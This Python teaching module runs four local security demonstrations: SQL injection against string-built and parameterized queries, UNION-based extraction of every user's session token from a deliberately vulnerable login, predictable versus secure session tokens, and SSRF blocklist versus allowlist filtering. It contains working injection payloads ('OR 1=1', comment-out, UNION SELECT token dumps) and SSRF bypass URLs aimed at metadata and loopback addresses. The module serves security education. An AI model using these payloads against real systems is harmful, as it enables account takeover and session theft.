"""Four experiments to run on your own machine. Every number they print is measured or computed
there and then, on 127.0.0.1.

inject      the same inputs through a string-built query and a parameterized one: who gets in
exfiltrate  dump every user's token from the vulnerable login over real HTTP: requests and bytes
tokens      generate session tokens two ways: collisions, and how guessable each is
ssrf        a blocklist and an allowlist judge the same URLs: how many internal ones slip through
"""

import os
import platform
import random
import secrets
import sqlite3
import sys
import time
from urllib.parse import urlsplit

from trust.http import Client, serve
from trust.store import PEOPLE, connect, seed_people


def describe() -> str:
    return f"Python {sys.version.split()[0]}, {platform.system()}, {os.cpu_count()} CPUs"


def _row(cols: list[str], widths: list[int]) -> str:
    return "  " + "  ".join(c.ljust(w) for c, w in zip(cols, widths, strict=False))


# ----------------------------------------------------------------------------- inject


def inject() -> None:
    """Run inputs through both query styles, and time how long each style takes per query."""
    print(f"inject: string-built SQL vs parameters. {describe()}\n")
    db = connect()
    seed_people(db)

    def built(email: str, password: str) -> int:
        query = f"SELECT id FROM users WHERE email = '{email}' AND password = '{password}'"
        try:
            return len(db.execute(query).fetchall())
        except sqlite3.Error:
            return -1

    def bound(email: str, password: str) -> int:
        rows = db.execute(
            "SELECT id FROM users WHERE email = ? AND password = ?", (email, password)
        ).fetchall()
        return len(rows)

    inputs = [
        ("u_1041@acme.test", "hunter2-correct", "a real sign-in"),
        ("u_1041@acme.test", "wrong", "a wrong password"),
        ("x' OR '1'='1' -- ", "x", "OR always true"),
        ("u_1099@acme.test' -- ", "x", "comment out the password"),
    ]
    widths = [26, 18, 14, 14]
    print(_row(["input", "what it is", "built rows", "bound rows"], widths))
    print(_row(["-" * 24, "-" * 16, "-" * 12, "-" * 12], widths))
    for email, password, label in inputs:
        b, p = built(email, password), bound(email, password)
        print(_row([email[:24], label, _rows(b), _rows(p)], widths))

    runs = 20000
    t0 = time.perf_counter()
    for _ in range(runs):
        db.execute(
            "SELECT id FROM users WHERE email = ? AND password = ?", ("u_1041@acme.test", "x")
        ).fetchall()
    bound_us = (time.perf_counter() - t0) / runs * 1e6
    t0 = time.perf_counter()
    for _ in range(runs):
        db.execute(
            "SELECT id FROM users WHERE email = 'u_1041@acme.test' AND password = 'x'"
        ).fetchall()
    built_us = (time.perf_counter() - t0) / runs * 1e6
    print(
        f"\n  Over {runs:,} queries: parameters {bound_us:.2f} us each, "
        f"inline text {built_us:.2f} us each."
    )
    print("  Binding is not the slow path. It is the safe path, and it is not slower here.")


def _rows(n: int) -> str:
    if n < 0:
        return "SQL error"
    return f"{n} row" + ("" if n == 1 else "s")


# ----------------------------------------------------------------------------- exfiltrate


def exfiltrate() -> None:
    """Pull every user's token out of the vulnerable login with UNION injection, over real HTTP."""
    from cases.case01_sqli import build

    print(f"exfiltrate: dumping tokens through the login. {describe()}\n")
    widths = [8, 24, 10]
    recovered: list[tuple[str, str]] = []
    total_bytes = 0
    with serve(build()) as port:
        client = Client(port)
        t0 = time.perf_counter()
        print(_row(["request", "token recovered", "bytes"], widths))
        print(_row(["-" * 6, "-" * 22, "-" * 8], widths))
        for index in range(len(PEOPLE)):
            # One row at a time: UNION a row whose first column is the token, skipping the ones
            # already seen. The login returns that value as if it were the signed-in user.
            payload = (
                f"zzz' UNION SELECT token, role FROM users "
                f"ORDER BY token LIMIT 1 OFFSET {index} -- "
            )
            reply = client.post("/login", form={"email": payload, "password": "x"})
            total_bytes += len(reply.raw)
            token = reply.json.get("user", "")
            recovered.append((f"req {index + 1}", token))
            print(_row([f"{index + 1}", token, str(len(reply.raw))], widths))
        elapsed_ms = (time.perf_counter() - t0) * 1e3

    print(
        f"\n  {len(recovered)} tokens in {len(recovered)} requests, "
        f"{total_bytes} bytes, {elapsed_ms:.1f} ms total."
    )
    print("  No password was ever guessed. The query was simply told to return something else.")


# ----------------------------------------------------------------------------- tokens


def tokens() -> None:
    """Make session tokens two ways and measure collisions and guessability."""
    print(f"tokens: a predictable scheme vs secrets.token_urlsafe. {describe()}\n")
    count = 200_000

    # A scheme that looks random but is seeded from the clock at a known second: a small space.
    weak_space = 60_000  # "one of the tokens issued this minute"
    rng = random.Random(1234)
    t0 = time.perf_counter()
    weak = [f"sess_{rng.randrange(weak_space):05d}" for _ in range(count)]
    weak_ms = (time.perf_counter() - t0) * 1e3
    weak_distinct = len(set(weak))

    t0 = time.perf_counter()
    strong = [secrets.token_urlsafe(24) for _ in range(count)]
    strong_ms = (time.perf_counter() - t0) * 1e3
    strong_distinct = len(set(strong))

    widths = [22, 12, 12, 12, 12]
    print(_row(["scheme", "tokens", "distinct", "collisions", "space bits"], widths))
    print(_row(["-" * 20, "-" * 10, "-" * 10, "-" * 10, "-" * 10], widths))
    print(
        _row(
            [
                "predictable",
                f"{count:,}",
                f"{weak_distinct:,}",
                f"{count - weak_distinct:,}",
                f"{weak_space.bit_length()}",
            ],
            widths,
        )
    )
    print(
        _row(
            [
                "token_urlsafe(24)",
                f"{count:,}",
                f"{strong_distinct:,}",
                f"{count - strong_distinct:,}",
                "192",
            ],
            widths,
        )
    )
    print(
        f"\n  Generated in {weak_ms:.0f} ms and {strong_ms:.0f} ms. "
        f"The predictable scheme repeats {count - weak_distinct:,} times;"
    )
    print(
        f"  guessing one of its {weak_space:,} values takes at most {weak_space:,} tries. "
        "The strong one did not repeat once."
    )


# ----------------------------------------------------------------------------- ssrf


def ssrf() -> None:
    """Judge the same URLs with a blocklist and with an allowlist, and count what slips through."""
    print(f"ssrf: a blocklist vs an allowlist on the same URLs. {describe()}\n")
    allowed_hosts = {"images.acme.test"}
    # a blocklist someone might write after one incident: block the known metadata IP and anything
    # with "internal" in it.
    blocklist = ["169.254.169.254", "internal"]

    targets = [
        ("http://images.acme.test/logo.png", False, "the avatar host"),
        ("http://169.254.169.254/latest/meta-data/", True, "cloud metadata IP"),
        ("http://metadata.internal/secret", True, "internal by name"),
        ("http://169.254.169.254.nip.io/", True, "IP wrapped in a name"),
        ("http://127.0.0.1:8080/admin", True, "loopback admin"),
        ("http://[::1]/admin", True, "loopback, IPv6"),
        ("http://metadata-service.acme.test/", True, "another internal host"),
    ]

    def blocked_by_list(url: str) -> bool:
        return any(bad in url for bad in blocklist)

    def blocked_by_allow(url: str) -> bool:
        return (urlsplit(url).hostname or "") not in allowed_hosts

    def verdict(blocked: bool, internal: bool) -> str:
        if blocked:
            return "block"
        return "ALLOW!" if internal else "allow"

    widths = [40, 20, 12, 12]
    print(_row(["url", "what it is", "blocklist", "allowlist"], widths))
    print(_row(["-" * 38, "-" * 18, "-" * 10, "-" * 10], widths))
    blocklist_leaks = 0
    allowlist_leaks = 0
    for url, internal, label in targets:
        bl = blocked_by_list(url)
        al = blocked_by_allow(url)
        if internal and not bl:
            blocklist_leaks += 1
        if internal and not al:
            allowlist_leaks += 1
        print(_row([url[:38], label, verdict(bl, internal), verdict(al, internal)], widths))

    internal_total = sum(1 for _, internal, _ in targets if internal)
    print(
        f"\n  Of {internal_total} internal targets, the blocklist lets {blocklist_leaks} through "
        f"and the allowlist lets {allowlist_leaks} through."
    )
    print("  You cannot name every bad address. You can name the few good ones.")


EXPERIMENTS = {
    "inject": inject,
    "exfiltrate": exfiltrate,
    "tokens": tokens,
    "ssrf": ssrf,
}
